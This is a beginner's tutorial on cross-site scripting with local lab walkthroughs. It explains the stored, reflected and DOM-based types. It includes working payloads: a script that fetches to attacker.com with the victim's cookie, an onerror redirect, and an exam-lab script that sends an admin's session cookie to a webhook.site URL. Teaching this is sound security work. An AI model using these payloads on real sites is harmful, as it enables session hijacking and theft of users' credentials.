# 🔽 XSS Injection

## **Cross-Site Scripting (XSS) - Beginner's Guide**

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. In this guide, we'll explore the basics of XSS and provide insights into prevention techniques.

<figure><img src="https://blog.hubspot.com/hs-fs/hubfs/Google%20Drive%20Integration/draft%20-%20cross%20site%20scripting.png?width=650&#x26;name=draft%20-%20cross%20site%20scripting.png" alt=""><figcaption></figcaption></figure>

### **1. Understanding Cross-Site Scripting (XSS)**

#### **What is XSS?**

XSS occurs when an attacker injects malicious scripts into web pages viewed by others. These scripts can execute in the context of a user's browser, leading to unauthorized actions, data theft, or other malicious activities.

#### **How Does XSS Work?**

1. **User Input Handling:**
   * Web applications accept and display user inputs, such as in search bars or comment sections.
2. **Malicious Input:**
   * An attacker injects scripts (JavaScript) into user-provided input.
3. **Script Execution:**
   * When another user views the affected page, the injected script executes in their browser.
4. **Unauthorized Actions:**
   * The script can steal cookies, session tokens, or perform actions on behalf of the user.

### **2. Types of XSS**

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

#### **Stored XSS:**

* The injected script is permanently stored on the target server and served to users who access the affected page.

```html
<!-- Malicious Comment -->
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

#### **Reflected XSS:**

* The injected script is part of the URL and gets reflected off a web server to the user.

```url
https://vulnerable-site.com/search?query=<script>alert("XSS")</script>
```

#### **DOM-based XSS:**

* The attack occurs entirely on the client side, manipulating the Document Object Model (DOM) of a web page.

```html
<!-- URL: https://vulnerable-site.com/page#<script>alert("DOM XSS")</script> -->
<script>
  // JavaScript on the page reads the fragment and executes the script
  window.location.hash.substr(1); 
</script>
```

## Labs:

### DOM Based&#x20;

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

Consider a simple "add item" website that allows users to input text. Let's examine a potential vulnerability using an injected script:

```
<img src=x onerror="window.location.href='https://tcm-sec.com'">
```

* DOM-based XSS occurs when the client-side script modifies the DOM, leading to the execution of malicious code.
* In the given example, an `<img>` tag is used, and the `onerror` attribute is manipulated to execute JavaScript code.
* When the browser encounters this script, it attempts to load the image specified in the `src` attribute (`x` in this case). If an error occurs during loading (triggered intentionally by `onerror`), the script inside the `onerror` attribute is executed.
* The JavaScript payload in the `onerror` attribute redirects the user's browser to the specified URL (`https://tcm-sec.com`).
* This redirection could be replaced with more harmful actions, such as stealing user session cookies, defacing the website, or performing actions on behalf of the user without their consent

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption><p>page is redirected </p></figcaption></figure>

### XSS - Stored Lab

Stored Cross-Site Scripting (XSS) is a serious web application vulnerability that allows attackers to inject malicious scripts that are then permanently stored and served to other users. In this section, we will explore a lab environment using Firefox Multi-Account Containers to simulate and understand the implications of Stored XSS.

* Download and install the [Multi-Account Containers](https://addons.mozilla.org/fr/firefox/addon/multi-account-containers/) add-on for Firefox.
* Open a separate container for each session to create isolated environments.

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

Open one page of the chal in each container to have two separate sessions

**HTML Injection Test:**

As a preliminary step, inject a simple HTML tag to test if the injected content is stored persistently.

```
<h1>test</h1>
```

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption><p>injection html OK</p></figcaption></figure>

Observe that the injected HTML tag remains on the page after refreshing the container.

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption><p>it's a stored !</p></figcaption></figure>

so now we can go and test out some more interesting stuff:

**JavaScript Execution Test:**

In a different container, we inject a JavaScript script to prompt a message.

```
<script>prompt(1)</script>
```

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

Notice that the script executes, but upon submission, the page refreshes, indicating that the input is being rendered rather than executed.

and funny thing is that if we go on container 2 and refresh, we will have the prompt function executed and so will every user that loads the page:

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption><p>the 2 are loading </p></figcaption></figure>

now let's simulate stealing sensitive data from a user:

**Simulating Cookie Theft:**

Download and install the Cookie Editor add-on for Firefox to facilitate the capture and manipulation of cookies.

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

In Container 2, inject a script to alert the user's cookie.

```
<script>alert(document.cookie)</script>
```

* Observe that the script executed in Container 2 triggers an alert with the user's cookie.
* This demonstrates how a malicious actor could potentially steal sensitive user data, such as session cookies, leading to unauthorized access.

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

### Exam Lab

In this lab, we will explore a scenario where an attacker aims to steal an admin's session cookie through Cross-Site Scripting (XSS). To simulate this, we'll open two containers in Firefox—one for normal browsing and another for interacting with an admin. The objective is to inject a malicious script that sends the admin's session cookie to a webhook site.

Open one container for regular browsing and another for simulating an admin interaction. Navigate to the URL `http://localhost/labs/x0x03_admin.php` in the admin container.

There are plenty of ways we can inject some code to steal a cookie, let's list a few:

Set up a webhook URL at `https://webhook.site/` to capture the stolen session cookie.

<figure><img src="../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

```
<script>var i = new Image;i.src="https://webhook.site/c014X.X.X.X.X..."+document.cookie;</script>
```

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption><p>add /? </p></figcaption></figure>

This script creates an image element (`<img>`) and sets its source to the webhook URL with the appended admin session cookie.

The `/` followed by `?` is used to denote the start of the query parameters in a URL. In this case, it's appending the `document.cookie` value as a query parameter to the URL.

Explanation:

1. `https://webhook.site/c014X.X.X.X.X.../` is the base URL of the webhook.
2. `?` signifies the beginning of the query parameters.
3. `+document.cookie` adds the value of the `document.cookie` property as a query parameter. The `+` here is used for string concatenation.

and when we refresh our admin page (or the admin interacts with our payload), we get the response in webhook:

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>
